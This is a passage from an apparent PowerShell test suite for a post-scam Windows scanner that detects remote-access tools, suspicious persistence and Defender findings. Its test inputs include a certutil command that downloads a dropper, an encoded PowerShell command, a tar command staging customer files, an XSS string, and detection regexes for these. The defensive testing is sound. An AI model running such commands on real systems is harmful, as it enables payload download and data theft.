    ArtifactType='AppxPackage';Name='MicrosoftCorporationII.QuickAssist';DisplayName='MicrosoftCorporationII.QuickAssist'
    PackageName='MicrosoftCorporationII.QuickAssist_2026.1.0.0_x64';Path='C:\Program Files\WindowsApps\MicrosoftCorporationII.QuickAssist_2026.1.0.0_x64'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $quickAssist)
Assert-True ($matches.Product.id -contains 'quick-assist') 'Microsoft Quick Assist AppX package is detected'

$rdp = New-TestEvidence @{
    ArtifactType='NativeFeature';Name='Windows Remote Desktop';DisplayName='Windows Remote Desktop is enabled'
    ProductName='Windows Remote Desktop (RDP)'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $rdp)
Assert-True ($matches.Product.id -contains 'windows-rdp') 'Enabled Windows Remote Desktop configuration is detected'

Assert-True (Test-CompuTekUserWritablePath 'C:\Users\Victim\AppData\Roaming\Adobe\AdobeReader.exe') 'AppData service path is treated as user-writable and suspicious'
Assert-True (-not (Test-CompuTekUserWritablePath 'C:\Windows\System32\svchost.exe')) 'System32 is not treated as a user-writable path'

$path = Get-CompuTekExecutablePath '"C:\Users\Victim\AppData\Roaming\Tool\agent.exe" --service'
Assert-True ($path -eq 'C:\Users\Victim\AppData\Roaming\Tool\agent.exe') 'Quoted service executable path is parsed correctly'

$unquoted = Split-CompuTekUninstallCommand 'C:\Program Files\Vendor\uninstall.exe /quiet'
Assert-True ($unquoted.FilePath -eq 'C:\Program Files\Vendor\uninstall.exe') 'Unquoted uninstall path containing spaces is parsed through .exe'
Assert-True (@($unquoted.Arguments) -contains '/quiet') 'Uninstall arguments are preserved'

$msi = Split-CompuTekUninstallCommand 'MsiExec.exe /I{12345678-1234-1234-1234-1234567890AB}'
Assert-True ($msi.FilePath -eq 'msiexec.exe' -and @($msi.Arguments) -contains '/x') 'MSI maintenance command is converted to an uninstall command'

$noArgumentUninstall = & $scannerModule {
    param($executablePath)
    $script:ArgumentListWasPassed = $true
    function Start-Process {
        param($FilePath,$ArgumentList,$PassThru,$ErrorAction)
        $script:ArgumentListWasPassed = $PSBoundParameters.ContainsKey('ArgumentList')
        $fake = [pscustomobject]@{ExitCode=0}
        $fake | Add-Member -MemberType ScriptMethod -Name WaitForExit -Value { param($milliseconds) return $true }
        return $fake
    }
    try {
        $result = Invoke-CompuTekUninstallCommand -Command ('"{0}"' -f $executablePath) -TimeoutSeconds 10
        return [pscustomobject]@{Result=$result;ArgumentListWasPassed=$script:ArgumentListWasPassed}
    } finally {
        Remove-Item Function:\Start-Process -Force -ErrorAction SilentlyContinue
    }
} (Join-Path $env:SystemRoot 'System32\where.exe')
Assert-True ($noArgumentUninstall.Result.Success -and -not $noArgumentUninstall.ArgumentListWasPassed) 'An argument-free registered uninstaller starts without an invalid empty ArgumentList'

$timedOutUninstall = & $scannerModule {
    param($executablePath)
    function Start-Process {
        param($FilePath,$ArgumentList,$PassThru,$ErrorAction)
        $fake = [pscustomobject]@{ExitCode=$null;Killed=$false}
        $fake | Add-Member -MemberType ScriptMethod -Name WaitForExit -Value { param($milliseconds) return $false }
        $fake | Add-Member -MemberType ScriptMethod -Name Kill -Value { $this.Killed = $true }
        return $fake
    }
    try {
        return Invoke-CompuTekUninstallCommand -Command ('"{0}" /quiet' -f $executablePath) -TimeoutSeconds 10
    } finally {
        Remove-Item Function:\Start-Process -Force -ErrorAction SilentlyContinue
    }
} (Join-Path $env:SystemRoot 'System32\where.exe')
Assert-True ($timedOutUninstall.TimedOut -and -not $timedOutUninstall.Success -and $null -eq $timedOutUninstall.ExitCode) 'A stuck offline uninstaller returns a timeout result instead of blocking indefinitely'

$postScamTokens = $null
$postScamErrors = $null
$postScamPath = Join-Path $repoRoot 'scripts\PostScam_SystemIntegrityScanner.ps1'
$postScamSource = Get-Content -LiteralPath $postScamPath -Raw
$postScamAst = [System.Management.Automation.Language.Parser]::ParseFile($postScamPath,[ref]$postScamTokens,[ref]$postScamErrors)
foreach ($functionName in @('Test-CompuTekPostScamUserWritableRisk','Test-CompuTekPostScamPersistenceText','Get-CompuTekDefenderFindingName','Test-CompuTekTrustedScannerScriptPath','Get-CompuTekPostScamDataValue','Get-CompuTekPostScamFirstDataValue','Get-CompuTekPostScamDisplayResource','Get-CompuTekPostScamReason','Get-CompuTekPostScamReviewStep','ConvertTo-CompuTekHtmlText','Get-CompuTekPostScamCategoryLabel','New-CompuTekPostScamHtmlReport')) {
    $postScamFunction = @($postScamAst.FindAll({param($node) $node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $node.Name -eq $functionName},$true))[0]
    Invoke-Expression $postScamFunction.Extent.Text
}
$remoteRegex = '(?i)(screenconnect|anydesk)'
$suspiciousCommandRegex = '(?i)(encodedcommand|invoke-webrequest|\bcertutil(?:\.exe)?\b[^\r\n]*(?:-urlcache|-decode)|\btar(?:\.exe)?\b)'
$script:PostScamUserWritableTextRegex = '(?i)\\users\\[^\\]+\\(?:appdata|downloads|desktop)\\|\\windows\\temp\\'
$script:PostScamTrustedApplicationPathRegex = '(?i)[a-z]:\\users\\[^\\\r\n"]+\\appdata\\local\\microsoft\\(?:(?:teams\\(?:current\\teams|update))|(?:onedrive\\(?:(?:\d+(?:\.\d+)+\\)?(?:onedrive|onedrivelauncher|onedrivestandaloneupdater|filecoauth)))|(?:windowsapps\\ms-teams))\.exe'
Assert-True (-not (Test-CompuTekPostScamPersistenceText 'Service FileSyncHelper installed under C:\Program Files\Vendor')) 'An ordinary recent service installation is supplemental evidence, not an actionable scam backdoor'
Assert-True (-not (Test-CompuTekPostScamPersistenceText 'ScreenConnect Client service installed under C:\Program Files\ScreenConnect')) 'A named remote-support service in Program Files is handled by the remote scanner instead of being called a post-scam backdoor'
Assert-True (Test-CompuTekPostScamPersistenceText 'powershell.exe -EncodedCommand AAAA') 'A suspicious persistence command remains actionable'
Assert-True (Test-CompuTekPostScamPersistenceText 'C:\Users\Victim\AppData\Roaming\helper.exe') 'Persistence from a user-writable profile path remains actionable'
Assert-True (-not (Test-CompuTekPostScamPersistenceText 'PowerShell provider started and Firefox was -os-restarted')) 'The word fragment tar inside started or restarted is not mistaken for the tar archive tool'
Assert-True (-not (Test-CompuTekPostScamPersistenceText 'rundll32.exe shell32.dll,Control_RunDLL')) 'An ordinary Windows rundll32 command is not suspicious by name alone'
Assert-True (Test-CompuTekPostScamPersistenceText 'certutil.exe -urlcache -f https://example.invalid/dropper.exe') 'A certutil download command remains actionable'
Assert-True (Test-CompuTekPostScamPersistenceText 'tar.exe -cf customer-files.tar Documents') 'An actual tar staging command remains actionable'
Assert-True ($postScamSource -match "'Windows PowerShell' -Ids @\(800\)" -and $postScamSource -notmatch "'Windows PowerShell' -Ids @\(400,403,600,800\)") 'Classic PowerShell engine startup and shutdown events are not classified as suspicious commands'
Assert-True ($postScamSource -match 'hehggadaopoacecdllhhajmbjkdcmajg' -and $postScamSource -match '\$isTrustedExtension') 'The exact official ChatGPT extension ID is retained as supplemental inventory instead of a warning'
$defenderMessage = "Microsoft Defender found malware.`r`nName: Trojan:Win32/TestThreat`r`nPath: file:_C:\Temp\bad.exe"
Assert-True ((Get-CompuTekDefenderFindingName -EventId 1116 -Message $defenderMessage) -eq (Get-CompuTekDefenderFindingName -EventId 1117 -Message $defenderMessage)) 'Defender detection and remediation events for the same threat consolidate into one warning group'
Assert-True (Test-CompuTekTrustedScannerScriptPath 'C:\ProgramData\CompuTek\ScannerApp\Engine\1.4.25.0\CompuTek.Scanner.Common.psm1') 'PowerShell logging from the protected embedded scanner engine is recognized as scanner-generated evidence'
Assert-True (Test-CompuTekTrustedScannerScriptPath 'C:\Work\computek-system-scan-windows-app\scripts\PostScam_SystemIntegrityScanner.ps1') 'PowerShell logging from the scanner source tree is recognized during development tests'
Assert-True (-not (Test-CompuTekTrustedScannerScriptPath 'C:\Users\Victim\Downloads\CompuTek.Scanner.Common.psm1')) 'A scanner-named script in an untrusted folder is not suppressed'

$defenderDetected = [pscustomobject]@{Category='SecurityControl';Name='Microsoft Defender detection: Trojan:Win32/TestThreat';EventId=1116;Details='Detected';Data=@{'Threat Name'='Trojan:Win32/TestThreat';'Threat ID'='12345';'Severity Name'='Severe';'Category Name'='Trojan';Path='CmdLine:_C:\Program Files\TrustedApp\helper.exe process-text {"large":"content"}'}}
$defenderRemediated = [pscustomobject]@{Category='SecurityControl';Name='Microsoft Defender detection: Trojan:Win32/TestThreat';EventId=1117;Details='Remediated';Data=@{'Threat Name'='Trojan:Win32/TestThreat';'Threat ID'='12345';'Severity Name'='Severe';'Category Name'='Trojan';Path='CmdLine:_C:\Program Files\TrustedApp\helper.exe process-text {"large":"content"}';'Action Name'='Remove';'Additional Actions String'='No additional actions required';'Error Code'='0x00000000';'Error Description'='The operation completed successfully.'}}
$defenderReason = Get-CompuTekPostScamReason -Items @($defenderRemediated,$defenderDetected)
Assert-True ($defenderReason -match 'Severe Trojan' -and $defenderReason -match 'Threat ID: 12345' -and $defenderReason -match 'command line: C:\\Program Files\\TrustedApp\\helper\.exe process-text') 'Defender explanations identify the classification, threat ID, and concise affected command line'
Assert-True ($defenderReason -match 'recorded action: Remove' -and $defenderReason -match 'No additional actions required' -and $defenderReason -match '0x00000000' -and $defenderReason -match 'completed successfully') 'Defender explanations show whether remediation succeeded and whether more action is required'
Assert-True ((Get-CompuTekPostScamReviewStep -Items @($defenderDetected,$defenderRemediated)) -match 'command-line/content detection' -and (Get-CompuTekPostScamReviewStep -Items @($defenderDetected,$defenderRemediated)) -match 'not proof') 'Defender review guidance distinguishes a CmdLine alert from proof that the named EXE is infected'
$firewallReason = Get-CompuTekPostScamReason -Items @([pscustomobject]@{Category='FirewallBackdoor';Name='ncplayer.exe';Path='C:\Users\Victim\AppData\Roaming\NinjaRemote\ncplayer.exe';Details='action=Allow';Data=$null})
Assert-True ($firewallReason -match 'enabled inbound allow rule' -and $firewallReason -match 'user-writable') 'Firewall explanations state the exact risk created by an AppData executable'

$htmlTestPath = Join-Path $env:TEMP ('CompuTek-PostScam-' + [Guid]::NewGuid().ToString('N') + '.html')
try {
    $htmlFinding = [pscustomobject]@{Severity='High';Category='SecurityControl';Name='<script>alert(1)</script>';Occurrences=2;LatestTimeUtc='2026-08-28T18:00:00Z';Path='C:\Evidence\item.exe';WhyIncluded='Detected & blocked';WhatToCheck='Open protection history';TechnicalDetails='Event <1117>';Details='Detected & blocked';Sources='Defender'}
    [void](New-CompuTekPostScamHtmlReport -OutputPath $htmlTestPath -ActionableGroups @($htmlFinding) -SupplementalRecords @() -CollectionGaps @('Security log unavailable') -Cutoff ([datetime]'2026-08-21') -ComputerName 'TEST-PC')
    $htmlTestContent = Get-Content -LiteralPath $htmlTestPath -Raw
    Assert-True ($htmlTestContent -match '<!doctype html>' -and $htmlTestContent -match 'Technician review needed' -and $htmlTestContent -match '&lt;script&gt;alert\(1\)&lt;/script&gt;') 'The easy-to-read report is created and safely encodes collected evidence'
    Assert-True ($htmlTestContent -notmatch '<script>alert\(1\)</script>' -and $htmlTestContent -match 'What the technician should check' -and $htmlTestContent -match 'Technical evidence' -and $htmlTestContent -match 'Event &lt;1117&gt;') 'The HTML report separates plain-language reasons, technician checks, and safely encoded technical evidence'
} finally {
    Remove-Item -LiteralPath $htmlTestPath -Force -ErrorAction SilentlyContinue
}

if ($script:Failures -gt 0) {
    Write-Host "$script:Failures test(s) failed." -ForegroundColor Red
    exit 1
}
Write-Host 'All scanner tests passed.' -ForegroundColor Green
exit 0
